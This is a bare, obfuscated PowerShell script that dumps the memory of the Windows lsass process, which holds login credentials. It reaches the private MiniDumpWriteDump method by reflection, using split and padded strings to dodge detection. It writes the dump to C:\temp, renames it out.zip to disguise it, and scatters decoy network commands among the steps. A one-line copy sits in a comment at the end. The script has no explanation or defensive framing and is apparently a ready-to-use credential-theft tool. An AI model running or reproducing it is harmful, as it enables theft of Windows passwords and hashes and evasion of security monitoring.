
mkdir "C:\temp"
$x=@(('Sy0st'+'0em.Man0age'+'me0nt.Au0tom'+'ati0on.Wi0ndo'+'ws0Err0orRe'+'por0tin0g').Replace("0",""),('N1ati1v'+'eM1eth1ods').Replace("1",""),('N1on'+'Pu1bli1c').Replace("1",""))
$A = [PSObject].Assembly.GetType($x[0])
$B = $A.GetNestedType($x[1], $x[2])
$C = [Reflection.BindingFlags] '3N3o3n3P3u3b3l3i3c3, 3S3t3a3t3i3c3'.Replace("3","")
route print
$D = $B.GetMethod(('M_i_n_i_D_u_m_'+'_p_W_r_i_t_e_D_u_m_p_').Replace("_",""), $C)
$F = New-Object IO.FileStream("C:\temp\ls_$((gps ("l"+"sas"+"s")).Id).dmp", [IO.FileMode]::Create)
arp -a
cd "C:\temp";ls
$R = $D.Invoke($null, @((gps ("l"+"sas"+"s")).Handle,$G,$F.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
$F.Close()
mv "C:\temp\ls_$((gps ("l"+"sas"+"s")).Id).dmp" "C:\temp\out.zip"
cd "C:\temp";ls


#mkdir "C:\temp";$x=@(('Sy0st'+'0em.Man0age'+'me0nt.Au0tom'+'ati0on.Wi0ndo'+'ws0Err0orRe'+'por0tin0g').Replace("0",""),('N1ati1v'+'eM1eth1ods').Replace("1",""),('N1on'+'Pu1bli1c').Replace("1",""));$A = [PSObject].Assembly.GetType($x[0]);$B = $A.GetNestedType($x[1], $x[2]);$C = [Reflection.BindingFlags] '3N3o3n3P3u3b3l3i3c3, 3S3t3a3t3i3c3'.Replace("3","");$D = $B.GetMethod(('M_i_n_i_D_u_m_'+'_p_W_r_i_t_e_D_u_m_p_').Replace("_",""), $C);$F = New-Object IO.FileStream("C:\temp\ls_$((gps ("l"+"sas"+"s")).Id).dmp", [IO.FileMode]::Create);arp -a;cd "C:\temp";ls;$R = $D.Invoke($null, @((gps ("l"+"sas"+"s")).Handle,$G,$F.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));$F.Close();mv "C:\temp\ls_$((gps ("l"+"sas"+"s")).Id).dmp" "C:\temp\out.zip";cd "C:\temp";ls
